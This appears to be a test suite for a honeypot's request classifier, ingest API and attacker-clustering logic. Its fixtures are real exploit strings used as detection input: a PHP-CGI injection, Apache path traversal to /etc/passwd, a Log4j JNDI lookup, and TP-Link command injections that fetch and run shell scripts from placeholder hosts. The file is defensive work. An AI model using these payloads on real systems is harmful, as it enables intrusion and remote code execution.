from fastapi.testclient import TestClient

from app import classify, db, geoip, main

client = TestClient(main.app)


def test_classify_cve_2024_4577():
    probe = classify.classify("GET", "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "")
    assert probe == {"classification": "targeted", "stage": "probe", "cve_id": "CVE-2024-4577"}
    exploit = classify.classify(
        "POST", "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input", "<?php system('id'); ?>"
    )
    assert exploit == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2024-4577"}


def test_classify_high_volume_cves():
    tplink = classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "country=$(wget http://x/a.sh)")
    assert tplink == {"classification": "targeted", "stage": "exploit", "cve_id": "CVE-2023-1389"}
    assert classify.classify("POST", "/cgi-bin/luci/;stok=/locale?form=country", "")["stage"] == "probe"
    phpunit = classify.classify("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "<?php echo md5('x');")
    assert phpunit["cve_id"] == "CVE-2017-9841" and phpunit["stage"] == "exploit"
    apache = classify.classify("GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", "")
    assert apache == {"classification": "targeted", "stage": "probe", "cve_id": "CVE-2021-41773"}
    f5 = classify.classify("POST", "/mgmt/tm/util/bash", '{"command":"run","utilCmdArgs":"-c id"}')
    assert (f5["classification"], f5["cve_id"]) == ("noise", "CVE-2022-1388")  # recognised, not impersonated


def test_classify_noise():
    assert classify.classify("GET", "/", "")["stage"] == "recon"
    assert classify.classify("GET", "/.env", "") == {"classification": "noise", "stage": "probe", "cve_id": None}
    log4j = classify.classify("GET", "/", "", {"User-Agent": "${jndi:ldap://x/a}"})
    assert (log4j["classification"], log4j["cve_id"], log4j["stage"]) == ("noise", "CVE-2021-44228", "exploit")


def test_ingest_requires_key_and_stores(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "DB_PATH", tmp_path / "cap.db")
    monkeypatch.setattr(db, "DATABASE_URL", None)
    monkeypatch.setattr(main, "INGEST_KEY", "k")
    monkeypatch.setattr(
        geoip, "lookup", lambda conn, ips: {"45.33.32.156": {"asn": 14061, "country_code": "NL", "lat": 52.4, "lng": 4.9}}
    )
    hits = [
        {"id": "h1", "source_ip": "45.33.32.156", "port": 80, "timestamp": db.now_iso(), "method": "GET",
         "path": "/?%ADd+allow_url_include%3d1", "headers": {}, "body_preview": ""},
        {"id": "h2", "source_ip": "127.0.0.1", "port": 80, "timestamp": db.now_iso(), "method": "GET",
         "path": "/"},  # no test flag: loopback alone marks it as test
    ]
    assert client.post("/ingest/events", json=hits).status_code == 401
    assert client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "nope"}).status_code == 401
    ok = client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "k"})
    assert ok.json() == {"received": 2, "stored": 2}
    again = client.post("/ingest/events", json=hits, headers={"X-Ingest-Key": "k"})
    assert again.json()["stored"] == 0  # idempotent on hit id

    events = client.get("/api/events").json()
    assert len(events) == 1  # test hit hidden
    e = events[0]
    assert (e["classification"], e["cve_id"], e["asn"], e["lat"]) == ("targeted", "CVE-2024-4577", 14061, 52.4)
    assert client.get("/api/stats").json()["total_hits"] == 1


def test_ingest_disabled_without_key(monkeypatch):
    monkeypatch.setattr(main, "INGEST_KEY", "")
    assert client.post("/ingest/events", json=[], headers={"X-Ingest-Key": ""}).status_code == 401


def _hit(ip, path="/", body="", ua="", cve=None, cls="noise", t="2026-11-01T20:00:00Z", hosting=1, proxy=0):
    return {"source_ip": ip, "asn": 1, "country_code": "NL", "classification": cls, "cve_id": cve, "timestamp": t,
            "path": path, "body_preview": body, "user_agent": ua, "hosting": hosting, "proxy": proxy}


def test_actor_clustering(monkeypatch):
    from app import actors

    monkeypatch.setitem(actors._lists, "research", {"66.132.172.134": "censys", "66.132.172.135": "censys"})
    monkeypatch.setitem(actors._lists, "tor", {"185.220.101.60"})
    luci = "/cgi-bin/luci/;stok=/locale?form=country"
    rows = [
        # Same Mirai template, different bots, different download servers -> one actor (payload fingerprint).
        _hit("45.90.163.37", luci, "country=$(cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh)", cve="CVE-2023-1389", cls="targeted"),
        _hit("91.92.1.9", luci, "country=$(cd /tmp; wget http://5.6.7.8/x.sh; sh x.sh)", cve="CVE-2023-1389", cls="targeted"),
        # Two Censys scanners -> one actor labelled Censys, tagged scanner.
        _hit("66.132.172.134", "/", ua="Mozilla/5.0 (compatible; CensysInspect/1.1)"),
        _hit("66.132.172.135", "/robots.txt"),
        # Same bare probe from two unrelated hosts -> NOT merged.
        _hit("203.0.113.77", luci, cve="CVE-2023-1389", cls="targeted", ua="a"),
        _hit("198.18.5.5", luci, cve="CVE-2023-1389", cls="targeted", ua="b"),
        # Tor exit, unrelated -> its own actor.
        _hit("185.220.101.60", "/.env", hosting=0),
    ]
    ip_to_actor, dossiers = actors.build(rows)
    assert ip_to_actor["45.90.163.37"] == ip_to_actor["91.92.1.9"]
    assert ip_to_actor["66.132.172.134"] == ip_to_actor["66.132.172.135"]
    assert ip_to_actor["203.0.113.77"] != ip_to_actor["198.18.5.5"]
    assert len(dossiers) == 5
    by_label = {d["label"]: d for d in dossiers}
    assert by_label["Censys"]["tags"] == ["cloud", "scanner"]
    assert dossiers[0]["classification"] == "targeted" and dossiers[0]["cves"] == ["CVE-2023-1389"]
    tor_actor = next(d for d in dossiers if d["ips"] == ["185.220.101.60"])
    assert tor_actor["tags"] == ["tor"]
